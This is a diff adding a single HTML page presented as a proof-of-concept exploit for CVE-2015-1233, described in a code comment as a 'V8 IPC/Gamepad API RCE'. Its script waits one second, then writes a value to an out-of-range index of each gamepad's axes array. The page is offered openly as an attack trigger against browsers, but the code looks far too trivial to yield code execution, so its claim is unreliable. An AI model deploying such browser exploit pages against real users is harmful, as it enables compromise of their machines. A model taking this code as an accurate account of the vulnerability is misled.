@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>CVE-2015-1233 IPC/Gamepad API</title>
+</head>
+<body>
+<script>
+// CVE-2015-1233: V8 IPC/Gamepad API RCE
+function trigger() {
+    if (navigator.getGamepads) {
+        var gps = navigator.getGamepads();
+        for (var i = 0; i < gps.length; i++) {
+            if (gps[i]) {
+                gps[i].axes[100] = 1;
+            }
+        }
+    }
+}
+setTimeout(trigger, 1000);
+</script>
+</body>
+</html>
